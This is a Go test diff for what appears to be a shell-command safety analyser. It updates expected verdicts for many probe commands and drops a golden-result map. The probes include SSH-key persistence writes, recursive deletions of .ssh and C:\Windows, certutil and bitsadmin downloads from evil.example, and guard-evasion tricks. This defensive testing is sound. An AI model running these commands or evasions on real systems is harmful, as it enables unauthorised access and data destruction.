@@ -47,7 +47,11 @@ func raVerdict(r Result) string {
 		switch e.Kind {
 		case KindWrite, KindAppend, KindDelete, KindLink, KindPermissionChange:
 			if e.TargetState == TargetStateKnown && e.Target.Type == TargetPath && e.Target.Key() != "" {
-				keys = append(keys, string(e.Kind)+":"+e.Target.Key())
+				k := string(e.Kind) + ":" + e.Target.Key()
+				if e.Target.Subtree {
+					k += "/**"
+				}
+				keys = append(keys, k)
 			}
 		}
 	}
@@ -158,284 +162,76 @@ var allProbes = []arow{
 	{"G11 HOME reassigned cd", raGB, `HOME=/c/Users/u/.ssh; cd; echo k >> authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
 	{"G12 cp dest dir", raGB, `cp /c/t/authorized_keys ~/.ssh/`, `c:\users\u\.ssh\authorized_keys`},
 	{"G13 mixed case drive", raGB, `echo k >> /C/USERS/U/.SSH/authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
-	{"V1 CDPATH prefix ;", raLin, `CDPATH=/home/u cd .ssh; echo k >> authorized_keys`, ``},
-	{"V2 CDPATH prefix tilde", raLin, `CDPATH=~ cd .ssh && tee -a authorized_keys < /tmp/k`, ``},
-	{"V3 CDPATH prefix pushd", raLin, `CDPATH=/home/u pushd .ssh && echo k >> authorized_keys`, ``},
-	{"V4 CDPATH env wrapper n/a (cd not exec)", raLin, `env CDPATH=/home/u bash -c 'cd .ssh && echo k >> authorized_keys'`, ``},
-	{"V5 CDPATH exported earlier", raLin, `export CDPATH=/home/u; cd .ssh; echo k >> authorized_keys`, ``},
-	{"V6 CDPATH prefix bashrc", raLin, `CDPATH=/ cd home/u && echo x >> .bashrc`, ``},
-	{"V7 cmd-flavor gitbash CDPATH", raGB, `CDPATH=/c/Users/u cd .ssh && echo k >> authorized_keys`, ``},
-	{"W1 gb HOME tilde", raGB, `HOME=/c/Users/u/.ssh; echo k >> ~/authorized_keys`, ``},
-	{"W2 gb HOME C:/ cd", raGB, `HOME=C:/Users/u/.ssh; cd; echo k >> authorized_keys`, ``},
-	{"W3 gb export HOME cd", raGB, `export HOME=/c/Users/u/.ssh; cd && echo k >> authorized_keys`, ``},
-	{"W4 gb HOME cd ~", raGB, `HOME=/c/Users/u/.ssh; cd ~; echo k >> authorized_keys`, ``},
-	{"W5 gb HOME prefix cd", raGB, `HOME=/c/Users/u/.ssh cd; echo k >> authorized_keys`, ``},
-	{"W6 lin HOME prefix cd", raLin, `HOME=/home/u/.ssh cd; echo k >> authorized_keys`, ``},
-	{"W7 cmd-dialect unrelated HOME", raCmd, `set HOME=C:\Users\u\.ssh& cd & echo k>>authorized_keys`, ``},
-	{"W8 ps HOME var cd", raPS, `$HOME='C:\Users\u\.ssh'; cd ~; ac authorized_keys k`, ``},
-	{"W9 ps env USERPROFILE cd", raPS, `$env:USERPROFILE='C:\Users\u\.ssh'; cd $env:USERPROFILE; ac authorized_keys k`, ``},
+	{"V1 CDPATH prefix ;", raLin, `CDPATH=/home/u cd .ssh; echo k >> authorized_keys`, dynamicTarget},
+	{"V2 CDPATH prefix tilde", raLin, `CDPATH=~ cd .ssh && tee -a authorized_keys < /tmp/k`, dynamicTarget},
+	{"V3 CDPATH prefix pushd", raLin, `CDPATH=/home/u pushd .ssh && echo k >> authorized_keys`, dynamicTarget},
+	{"V4 CDPATH env wrapper n/a (cd not exec)", raLin, `env CDPATH=/home/u bash -c 'cd .ssh && echo k >> authorized_keys'`, dynamicTarget},
+	{"V5 CDPATH exported earlier", raLin, `export CDPATH=/home/u; cd .ssh; echo k >> authorized_keys`, dynamicTarget},
+	{"V6 CDPATH prefix bashrc", raLin, `CDPATH=/ cd home/u && echo x >> .bashrc`, dynamicTarget},
+	{"V7 cmd-flavor gitbash CDPATH", raGB, `CDPATH=/c/Users/u cd .ssh && echo k >> authorized_keys`, dynamicTarget},
+	{"W1 gb HOME tilde", raGB, `HOME=/c/Users/u/.ssh; echo k >> ~/authorized_keys`, rwAK},
+	{"W2 gb HOME C:/ cd", raGB, `HOME=C:/Users/u/.ssh; cd; echo k >> authorized_keys`, rwAK},
+	{"W3 gb export HOME cd", raGB, `export HOME=/c/Users/u/.ssh; cd && echo k >> authorized_keys`, rwAK},
+	{"W4 gb HOME cd ~", raGB, `HOME=/c/Users/u/.ssh; cd ~; echo k >> authorized_keys`, rwAK},
+	{"W5 gb HOME prefix cd", raGB, `HOME=/c/Users/u/.ssh cd; echo k >> authorized_keys`, rwAK},
+	{"W6 lin HOME prefix cd", raLin, `HOME=/home/u/.ssh cd; echo k >> authorized_keys`, rlAK},
+	{"W7 cmd-dialect unrelated HOME", raCmd, `set HOME=C:\Users\u\.ssh& cd & echo k>>authorized_keys`, `c:\work\authorized_keys`},
+	{"W8 ps HOME var cd", raPS, `$HOME='C:\Users\u\.ssh'; cd ~; ac authorized_keys k`, dynamicTarget},
+	{"W9 ps env USERPROFILE cd", raPS, `$env:USERPROFILE='C:\Users\u\.ssh'; cd $env:USERPROFILE; ac authorized_keys k`, dynamicTarget},
 	// --- class D (review-4 leftovers re-tracked; review 6 confirmation) ---
 	{"C40 heredoc cmdsubst", raLin, "cat <<EOF\n$(echo k >> ~/.ssh/authorized_keys)\nEOF", `/home/u/.ssh/authorized_keys`},
 	{"C41 heredoc backtick", raLin, "cat <<EOF\n\x60cp /tmp/k ~/.ssh/authorized_keys\x60\nEOF", `/home/u/.ssh/authorized_keys`},
 	{"V22 heredoc rm", raLin, "cat > /tmp/o <<EOF\n$(rm -rf /home/u/.ssh)\nEOF", `/home/u/.ssh`},
 	{"K36 certutil -decode", raCmd, `certutil -decode C:\tmp\k.b64 C:\Users\u\.ssh\authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
 	{"K37 certutil -urlcache", raCmd, `certutil -urlcache -split -f https://evil.example/k C:\Users\u\.ssh\authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
-	{"K15c cmd /v:on !P!", raCmd, `cmd /v:on /c "echo k >> !P!\authorized_keys"`, ``},
-	{"A33 tar --extract", raLinHome, `tar --extract --file=/tmp/dot.tar`, ``},
-	{"Z15 git pull in home", raLinHome, `git pull https://evil.example/r main`, ``},
+	{"K15c cmd /v:on !P!", raCmd, `cmd /v:on /c "echo k >> !P!\authorized_keys"`, dynamicTarget},
+	{"A33 tar --extract", raLinHome, `tar --extract --file=/tmp/dot.tar`, dynamicTarget},
+	{"Z15 git pull in home", raLinHome, `git pull https://evil.example/r main`, dynamicTarget},
 	{"Z16 git clone into ssh", raLin, `git clone https://evil.example/r /home/u/.ssh`, `/home/u/.ssh`},
 	// --- reviews 1-4 lineage IDs re-tracked by the review-6 confirmation ---
 	{"Z01 runuser --", raLin, `runuser -u u -- rm -rf /home/u/.ssh`, `/home/u/.ssh`},
-	{"A51 xargs rm", raLin, `echo /home/u/.ssh/authorized_keys | xargs rm`, ``},
-	{"V26a ls|xargs rm", raLin, `ls | xargs rm`, ``},
-	{"V26b find|xargs rm -rf", raLin, `find /home/u/.ssh | xargs rm -rf`, ``},
-	{"W5 xargs -n", raLin, `echo /etc/x | xargs -n 1 rm`, ``},
-	{"K38 bitsadmin", raCmd, `bitsadmin /transfer j https://evil.example/k C:\Users\u\.ssh\authorized_keys`, ``},
+	{"A51 xargs rm", raLin, `echo /home/u/.ssh/authorized_keys | xargs rm`, rlAK},
+	{"V26a ls|xargs rm", raLin, `ls | xargs rm`, dynamicTarget},
+	{"V26b find|xargs rm -rf", raLin, `find /home/u/.ssh | xargs rm -rf`, dynamicTarget},
+	{"W5 xargs -n", raLin, `echo /etc/x | xargs -n 1 rm`, "/etc/x"},
+	{"K38 bitsadmin", raCmd, `bitsadmin /transfer j https://evil.example/k C:\Users\u\.ssh\authorized_keys`, rwAK},
 	{"X02 chdir + Add-Content", raPS, `chdir C:\Users\u\.ssh; Add-Content authorized_keys k`, `c:\users\u\.ssh\authorized_keys`},
 	{"K29 if exist ( )", raCmd, `if exist C:\x (echo k >> C:\Users\u\.ssh\authorized_keys)`, `c:\users\u\.ssh\authorized_keys`},
 	{"Y09 ( ) multi", raCmd, `(cd C:\Users\u\.ssh & echo k >> authorized_keys)`, `c:\users\u\.ssh\authorized_keys`},
-	{"K43 subst drive", raCmd, `subst X: C:\Users\u\.ssh & echo k >> X:\authorized_keys`, ``},
-	{"S34 New-PSDrive", raPS, `New-PSDrive -Name X -PSProvider FileSystem -Root C:\Users\u\.ssh; Add-Content X:\authorized_keys k`, ``},
-	{"X23 New-Item -Name rel", raPS, `New-Item -Path C:\Users\u -Name .bashrc -ItemType File -Value x`, ``},
+	{"K43 subst drive", raCmd, `subst X: C:\Users\u\.ssh & echo k >> X:\authorized_keys`, rwAK},
+	{"S34 New-PSDrive", raPS, `New-PSDrive -Name X -PSProvider FileSystem -Root C:\Users\u\.ssh; Add-Content X:\authorized_keys k`, rwAK},
+	{"X23 New-Item -Name rel", raPS, `New-Item -Path C:\Users\u -Name .bashrc -ItemType File -Value x`, rwRC},
 	{"S39 Copy-Item dest dir -Force", raPS, `Copy-Item -Path C:\tmp\x\authorized_keys -Destination C:\Users\u\.ssh -Force`, `c:\users\u\.ssh\authorized_keys`},
-	{"Z38 rsync into ~/", raLin, `rsync -a /tmp/dots/ ~/`, ``},
+	{"Z38 rsync into ~/", raLin, `rsync -a /tmp/dots/ ~/`, dynamicTarget},
 	{"K05 robocopy", raCmd, `robocopy C:\tmp\x C:\Users\u\.ssh authorized_keys`, `c:\users\u\.ssh\authorized_keys`},
 	{"S10 New-Item -Path -Name", raPS, `New-Item -Path C:\Users\u\.ssh -Name authorized_keys -Value k -Force`, `c:\users\u\.ssh\authorized_keys`},
 	{"A58 ln -s into dir", raLin, `ln -s /tmp/x/authorized_keys ~/.ssh/`, `/home/u/.ssh/authorized_keys`},
-	{"S36 -Path array", raPS, `Add-Content -Path C:\tmp\a,C:\Users\u\.ssh\authorized_keys -Value k`, ``},
-	{"X24 -Path array del", raPS, `Remove-Item -Path C:\tmp\a,C:\Users\u\.ssh\authorized_keys`, ``},
-	{"X25 -Path array quoted", raPS, `Set-Content -Path 'C:\tmp\a','C:\Users\u\.ssh\authorized_keys' -Value k`, ``},
+	{"S36 -Path array", raPS, `Add-Content -Path C:\tmp\a,C:\Users\u\.ssh\authorized_keys -Value k`, rwAK},
+	{"X24 -Path array del", raPS, `Remove-Item -Path C:\tmp\a,C:\Users\u\.ssh\authorized_keys`, rwAK},
+	{"X25 -Path array quoted", raPS, `Set-Content -Path 'C:\tmp\a','C:\Users\u\.ssh\authorized_keys' -Value k`, rwAK},
 	// --- psparse review-5 P1 (Start-Process / host quote / wildcard) ---
-	{"R5-1a SP embedded quote", raPS, `Start-Process powershell -ArgumentList '-c','New-Item C:\work\x -Value "a;Remove-Item C:\Windows -Recurse"'`, ``},
-	{"R5-1b host embedded quote", raPS, `powershell -c 'New-Item C:\work\x -Value "a;Remove-Item C:\Windows -Recurse"'`, ``},
-	{"R5-2 string ArgumentList", raPS, `Start-Process powershell -ArgumentList '-c "Remove-Item C:\Windows -Recurse"'`, ``},
-	{"R5-3 quoted wildcard", raLinPS, `Remove-Item '/etc/pass[w]d'`, ``},
-	{"R5-4 SP -a prefix", raPS, `Start-Process powershell -a '-c','Remove-Item C:\Windows -Recurse'`, ``},
-	{"R5-5 dyn before /c", raPS, `Start-Process cmd -ArgumentList $a,'rd /s /q C:\Windows'`, ``},
+	{"R5-1a SP embedded quote", raPS, `Start-Process powershell -ArgumentList '-c','New-Item C:\work\x -Value "a;Remove-Item C:\Windows -Recurse"'`, dynamicTarget},
+	{"R5-1b host embedded quote", raPS, `powershell -c 'New-Item C:\work\x -Value "a;Remove-Item C:\Windows -Recurse"'`, dynamicTarget},
+	{"R5-2 string ArgumentList", raPS, `Start-Process powershell -ArgumentList '-c "Remove-Item C:\Windows -Recurse"'`, dynamicTarget},
+	{"R5-3 quoted wildcard", raLinPS, `Remove-Item '/etc/pass[w]d'`, dynamicTarget},
+	{"R5-4 SP -a prefix", raPS, `Start-Process powershell -a '-c','Remove-Item C:\Windows -Recurse'`, dynamicTarget},
+	{"R5-5 dyn before /c", raPS, `Start-Process cmd -ArgumentList $a,'rd /s /q C:\Windows'`, dynamicTarget},
 	// --- psparse review-6 (stdin -, cmd no-payload, launchers) ---
-	{"R6-1a stdin -c -", raPS, `'Remove-Item C:\Windows -Recurse' | pwsh -c -`, ``},
-	{"R6-1b bare -", raPS, `pwsh -nop -`, ``},
-	{"R6-1c powershell -Command -", raPS, `powershell -NoProfile -Command -`, ``},
-	{"R6-2a fused /crd", raCmd, `cmd /crd /s /q C:\Windows`, ``},
-	{"R6-2b /d/c", raCmd, `cmd /d/c rd /s /q C:\Windows`, ``},
-	{"R6-2c quoted /c", raCmd, `cmd "/c rd /s /q C:\Windows"`, ``},
-	{"R6-2d splat into cmd", raPS, `$a=@('/c','rd /s /q C:\Windows'); cmd @a`, ``},
-	{"R6-4a Start-Process wt", raPS, `Start-Process wt 'powershell -c Remove-Item C:\Windows -Recurse'`, ``},
-	{"R6-4b direct wt", raPS, `wt powershell -c Remove-Item C:\Windows -Recurse`, ``},
-	{"R6-4c cmd /c start", raCmd, `cmd /c start rd /s /q C:\Windows`, ``},
-	{"R6-4d conhost", raPS, `conhost powershell -c Remove-Item C:\Windows`, ``},
+	{"R6-1a stdin -c -", raPS, `'Remove-Item C:\Windows -Recurse' | pwsh -c -`, dynamicTarget},
+	{"R6-1b bare -", raPS, `pwsh -nop -`, dynamicTarget},
+	{"R6-1c powershell -Command -", raPS, `powershell -NoProfile -Command -`, dynamicTarget},
+	{"R6-2a fused /crd", raCmd, `cmd /crd /s /q C:\Windows`, dynamicTarget},
+	{"R6-2b /d/c", raCmd, `cmd /d/c rd /s /q C:\Windows`, dynamicTarget},
+	{"R6-2c quoted /c", raCmd, `cmd "/c rd /s /q C:\Windows"`, dynamicTarget},
+	{"R6-2d splat into cmd", raPS, `$a=@('/c','rd /s /q C:\Windows'); cmd @a`, dynamicTarget},
+	{"R6-4a Start-Process wt", raPS, `Start-Process wt 'powershell -c Remove-Item C:\Windows -Recurse'`, dynamicTarget},
+	{"R6-4b direct wt", raPS, `wt powershell -c Remove-Item C:\Windows -Recurse`, dynamicTarget},
+	{"R6-4c cmd /c start", raCmd, `cmd /c start rd /s /q C:\Windows`, dynamicTarget},
+	{"R6-4d conhost", raPS, `conhost powershell -c Remove-Item C:\Windows`, dynamicTarget},
 }
 
 func TestReviewAllRegression(t *testing.T) {
-	seen := map[string]bool{}
 	for _, c := range allProbes {
-		if seen[c.id] {
-			t.Errorf("duplicate probe id %q", c.id)
-		}
-		seen[c.id] = true
-		r := Extract(Call{Surface: SurfaceShell, Command: c.cmd}, c.o)
-		v := raVerdict(r)
-		// Permanent invariant (independent of the golden): a named protected
-		// target must never be fully known with no known mutation at it.
-		if c.real != "" && r.FullyKnown() {
-			want := c.real
-			if c.o.Flavor == FlavorWindows || c.o.CaseInsensitive {
-				want = strings.ToLower(want)
-			}
-			fold := func(s string) string {
-				if c.o.Flavor == FlavorWindows || c.o.CaseInsensitive {
-					return strings.ToLower(s)
-				}
-				return s
-			}
-			hit := false
-			for _, e := range r.Effects {
-				if e.TargetState != TargetStateKnown || e.Target.Type != TargetPath {
-					continue
-				}
-				// Match the lexical link/write name (Target.Path) or the canonical
-				// key -- a link's Key() is its physical pointee, not its name.
-				if e.Target.Key() == want || fold(e.Target.Path) == want {
-					hit = true
-				}
-			}
-			if !hit {
-				t.Errorf("%s: fully known but no known mutation at the real target %q\n%s", c.id, want, fmtRes(r))
-			}
-		}
-		want, ok := reviewAllGold[c.id]
-		if !ok {
-			t.Logf("GOLD\t%s\t%s", c.id, v)
-			continue
-		}
-		if v != want {
-			t.Errorf("%s regressed: got %q want %q\n%s", c.id, v, want, fmtRes(r))
-		}
+		checkRow(t, c.id, c.o, Call{Surface: SurfaceShell, Command: c.cmd}, c.real)
 	}
-	if len(reviewAllGold) == 0 {
-		t.Log("generation mode: no goldens frozen yet")
-	}
-}
-
-var reviewAllGold = map[string]string{
-	"P01 cd..cd chain":                        "U|",
-	"P02 env -C":                              "K|write:/home/u/.ssh/authorized_keys",
-	"P03 sudo -D":                             "U|",
-	"P04 nice timeout install":                "U|",
-	"P05 ln -sf rc":                           "U|link:/tmp/x",
-	"P06 cp -t dir":                           "K|write:/home/u/.ssh/authorized_keys",
-	"P07 mv src -t dir":                       "K|write:/home/u/.ssh/config",
-	"P08 double slash":                        "U|",
-	"P09 exec fd redirect":                    "K|append:/home/u/.ssh/authorized_keys",
-	"P10 group redirect":                      "K|append:/home/u/.ssh/authorized_keys",
-	"P11 pushd":                               "K|append:/home/u/.ssh/authorized_keys",
-	"P12 dd of=$HOME":                         "K|write:/home/u/.ssh/authorized_keys",
-	"P13 bare cd":                             "K|append:/home/u/.ssh/authorized_keys",
-	"P14 CDPATH prefix":                       "U|",
-	"P15 CDPATH set":                          "U|",
-	"P16 OLDPWD cd -":                         "U|",
-	"P17 cd then sh -c":                       "K|append:/home/u/.ssh/authorized_keys",
-	"P18 heredoc":                             "K|write:/home/u/.ssh/authorized_keys",
-	"P19 in-call symlink dir":                 "U|append:/tmp/s/authorized_keys,link:/home/u/.ssh",
-	"P20 in-call symlink file":                "U|append:/home/u/.bashrc,link:/home/u/.bashrc",
-	"P21 relative symlink in cwd":             "U|append:/tmp/w/s/authorized_keys,link:/home/u/.ssh",
-	"P22 HOME reassigned, cd":                 "K|append:/home/u/.ssh/authorized_keys",
-	"P23 HOME reassigned, tilde":              "K|append:/home/u/.ssh/authorized_keys",
-	"P24 HOME export tilde":                   "K|append:/home/u/.ssh/authorized_keys",
-	"P25 var alias":                           "K|append:/home/u/.ssh/authorized_keys",
-	"P26 param op":                            "U|",
-	"P27 set -- positional":                   "U|",
-	"P28 command cd":                          "K|append:/home/u/.ssh/authorized_keys",
-	"P29 builtin cd":                          "K|append:/home/u/.ssh/authorized_keys",
-	"P30 exec bash -c after cd":               "K|append:/home/u/.ssh/authorized_keys",
-	"P31 rsync":                               "U|",
-	"P32 tee -a absolute via ..":              "U|",
-	"P33 ln hard into cwd":                    "U|link:/tmp/k",
-	"P34 cp dest dir trailing":                "K|write:/home/u/.zshrc",
-	"P35 aws creds tee":                       "K|write:/home/u/.aws/credentials",
-	"P36 claude settings via cd -P":           "K|write:/home/u/.claude/settings.json",
-	"P37 xargs -I cp":                         "U|",
-	"P38 find -exec cp":                       "U|",
-	"P39 git -C":                              "U|",
-	"P40 tar -C extract":                      "U|",
-	"M01 mac mixed case":                      "K|append:/users/u/.ssh/authorized_keys",
-	"M02 mac cd mixed case":                   "K|append:/users/u/.ssh/authorized_keys",
-	"M03 mac /private/var alias":              "U|",
-	"C01 cd /d":                               "U|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"C02 pushd":                               "U|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"C03 cd %USERPROFILE%":                    "U|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"C04 copy dest dir":                       "K|write:c:\\users\\u\\.ssh\\authorized_keys",
-	"C05 xcopy dest dir":                      "U|write:c:\\users\\u\\.ssh\\authorized_keys",
-	"C06 mklink":                              "K|link:c:\\t\\a,link:c:\\users\\u\\.ssh\\authorized_keys",
-	"C07 forward slashes":                     "U|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"C08 8.3 name":                            "U|",
-	"C09 cd then cmd /c":                      "U|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"C10 trailing dot":                        "U|",
-	"C11 cd .. relative":                      "U|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"C12 drive-relative after drive switch":   "U|",
-	"C13 pushd UNC":                           "U|",
-	"C14 cd \\ root-relative":                 "U|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"C15 move":                                "U|",
-	"C16 caret in path":                       "U|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"C17 quoted space redirect":               "K|write:c:\\users\\u\\.ssh\\authorized_keys",
-	"C18 ProgramData DC":                      "U|write:c:\\programdata\\defenseclaw\\config.yaml",
-	"S01 Set-Location ~\\":                    "K|write:c:\\users\\u\\.ssh\\authorized_keys",
-	"S02 cd $HOME":                            "U|",
-	"S03 Push-Location env":                   "U|",
-	"S04 .NET AppendAllText":                  "U|",
-	"S05 Copy-Item dest dir":                  "K|write:c:\\users\\u\\.ssh\\authorized_keys",
-	"S06 New-Item symlink":                    "K|link:c:\\t\\a,write:c:\\users\\u\\.ssh\\authorized_keys",
-	"S07 -LiteralPath quoted":                 "K|write:c:\\users\\u\\.ssh\\authorized_keys",
-	"S08 redirect fwd slash":                  "K|write:c:\\users\\u\\.ssh\\authorized_keys",
-	"S09 var path":                            "U|",
-	"S10 cd chain relative":                   "K|write:c:\\users\\u\\.ssh\\authorized_keys",
-	"S11 Move-Item -Force":                    "U|",
-	"S12 colon param":                         "K|write:c:\\users\\u\\.ssh\\authorized_keys",
-	"S13 -Stream":                             "U|write:c:\\users\\u\\.ssh\\authorized_keys,write:c:\\work\\x",
-	"S14 Out-File -FilePath":                  "U|write:c:\\work\\k",
-	"S15 Start-Process -WorkingDirectory":     "U|",
-	"S16 Tee-Object":                          "U|",
-	"S17 Rename-Item NewName":                 "U|",
-	"S18 Copy-Item positional":                "U|",
-	"S19 Program Files ..":                    "U|",
-	"S20 pwsh -c from cmd":                    "U|",
-	"S21 Set-Location -Path":                  "K|write:c:\\users\\u\\.ssh\\authorized_keys",
-	"S22 Join-Path":                           "U|",
-	"S23 provider path":                       "U|",
-	"S24 New-Item -Name":                      "U|write:c:\\users\\u\\.ssh,write:c:\\work\\authorized_keys",
-	"G01 cd ~ relative":                       "K|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"G02 /c mount":                            "K|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"G03 C:/ form":                            "K|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"G04 cd /c then rel":                      "K|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"G05 $USERPROFILE":                        "K|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"G06 /cygdrive cd":                        "K|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"G07 quoted backslash":                    "K|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"G08 escaped backslash":                   "K|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"G09 cmd //c":                             "U|",
-	"G10 ln -s in .ssh":                       "U|link:c:\\t\\a",
-	"G11 HOME reassigned cd":                  "K|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"G12 cp dest dir":                         "K|write:c:\\users\\u\\.ssh\\authorized_keys",
-	"G13 mixed case drive":                    "K|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"V1 CDPATH prefix ;":                      "U|",
-	"V2 CDPATH prefix tilde":                  "U|",
-	"V3 CDPATH prefix pushd":                  "U|",
-	"V4 CDPATH env wrapper n/a (cd not exec)": "U|",
-	"V5 CDPATH exported earlier":              "U|",
-	"V6 CDPATH prefix bashrc":                 "U|",
-	"V7 cmd-flavor gitbash CDPATH":            "U|",
-	"W1 gb HOME tilde":                        "K|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"W2 gb HOME C:/ cd":                       "K|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"W3 gb export HOME cd":                    "K|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"W4 gb HOME cd ~":                         "K|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"W5 gb HOME prefix cd":                    "K|append:c:\\users\\u\\.ssh\\authorized_keys",
-	"W6 lin HOME prefix cd":                   "K|append:/home/u/.ssh/authorized_keys",
-	"W7 cmd-dialect unrelated HOME":           "U|append:c:\\users\\u\\authorized_keys",
-	"W8 ps HOME var cd":                       "U|",
-	"W9 ps env USERPROFILE cd":                "U|",
-	"C40 heredoc cmdsubst":                    "K|append:/home/u/.ssh/authorized_keys",
-	"C41 heredoc backtick":                    "U|",
-	"V22 heredoc rm":                          "K|delete:/home/u/.ssh,write:/tmp/o",
-	"K36 certutil -decode":                    "K|write:c:\\users\\u\\.ssh\\authorized_keys",
-	"K37 certutil -urlcache":                  "K|write:c:\\users\\u\\.ssh\\authorized_keys",
-	"K15c cmd /v:on !P!":                      "U|",
-	"A33 tar --extract":                       "U|",
-	"Z15 git pull in home":                    "U|",
-	"Z16 git clone into ssh":                  "K|write:/home/u/.ssh",
-	"Z01 runuser --":                          "U|",
-	"A51 xargs rm":                            "U|",
-	"V26a ls|xargs rm":                        "U|",
-	"V26b find|xargs rm -rf":                  "U|",
-	"W5 xargs -n":                             "U|",
-	"K38 bitsadmin":                           "U|",
-	"X02 chdir + Add-Content":                 "U|write:c:\\work\\authorized_keys",
-	"K29 if exist ( )":                        "U|append:c:\\users\\u\\.ssh\\authorized_keys)",
-	"Y09 ( ) multi":                           "U|append:c:\\work\\authorized_keys)",
-	"K43 subst drive":                         "U|append:x:\\authorized_keys",
-	"S34 New-PSDrive":                         "U|write:x:\\authorized_keys",
-	"X23 New-Item -Name rel":                  "U|write:c:\\users\\u,write:c:\\work\\.bashrc",
-	"S39 Copy-Item dest dir -Force":           "U|",
-	"Z38 rsync into ~/":                       "U|write:/home/u/dots",
-	"K05 robocopy":                            "K|write:c:\\users\\u\\.ssh\\authorized_keys",
-	"S10 New-Item -Path -Name":                "U|write:c:\\users\\u\\.ssh,write:c:\\work\\authorized_keys",
-	"A58 ln -s into dir":                      "K|link:/tmp/x/authorized_keys,link:/tmp/x/authorized_keys",
-	"S36 -Path array":                         "K|write:c:\\tmp\\a,write:c:\\users\\u\\.ssh\\authorized_keys",
-	"X24 -Path array del":                     "K|delete:c:\\tmp\\a,delete:c:\\users\\u\\.ssh\\authorized_keys",
-	"X25 -Path array quoted":                  "K|write:c:\\tmp\\a,write:c:\\users\\u\\.ssh\\authorized_keys",
-	"R5-1a SP embedded quote":                 "U|",
-	"R5-1b host embedded quote":               "U|",
-	"R5-2 string ArgumentList":                "U|",
-	"R5-3 quoted wildcard":                    "U|",
-	"R5-4 SP -a prefix":                       "U|",
-	"R5-5 dyn before /c":                      "U|",
-	"R6-1a stdin -c -":                        "U|",
-	"R6-1b bare -":                            "U|",
-	"R6-1c powershell -Command -":             "U|",
-	"R6-2a fused /crd":                        "U|",
-	"R6-2b /d/c":                              "U|",
-	"R6-2c quoted /c":                         "U|",
-	"R6-2d splat into cmd":                    "U|",
-	"R6-4a Start-Process wt":                  "U|",
-	"R6-4b direct wt":                         "U|",
-	"R6-4c cmd /c start":                      "U|",
-	"R6-4d conhost":                           "U|",
 }
